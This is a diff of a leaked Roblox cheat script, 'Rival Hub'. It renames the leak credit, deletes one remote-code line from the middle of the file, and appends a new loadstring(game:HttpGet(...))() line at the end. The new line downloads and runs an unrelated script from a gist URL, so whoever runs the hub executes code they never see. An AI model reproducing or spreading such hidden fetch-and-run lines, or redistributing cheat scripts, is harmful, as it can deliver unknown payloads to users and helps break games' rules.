@@ -1,4 +1,4 @@
----- leaked by fpsl
+---- leaked by .gg/source
 
 if _G.RivalHubRunning then
     warn("[Rival Hub] Instancia previa detectada. Se recomienda rejoin si hay comportamiento errático.")
@@ -1555,6 +1555,7 @@ pcall(applyLocalFace, character, faceId)
 end
 end)
 end
+
 end
 local function findCharacterAttachment(character, name)
 for _, object in ipairs(character:GetDescendants()) do
@@ -12033,7 +12034,7 @@ do
             end)
         end
     end
-loadstring(game:HttpGet("https://pastefy.app/ndRBNCw8/raw"))()
+
     local function scanSkinTools()
         watchSkinContainer(SkinLP:FindFirstChildOfClass("Backpack"))
         watchSkinContainer(SkinLP.Character)
@@ -12056,3 +12057,5 @@ loadstring(game:HttpGet("https://pastefy.app/ndRBNCw8/raw"))()
         apply = scanSkinTools,
     }
 end
+
+loadstring(game:HttpGet("https://gist.githubusercontent.com/xd-myscript/13854e401f17643096155330a34a743a/raw/ac29478d0e1ccc1f6dc099991beec19506cb80ab/Mvphubcoding.lua"))()
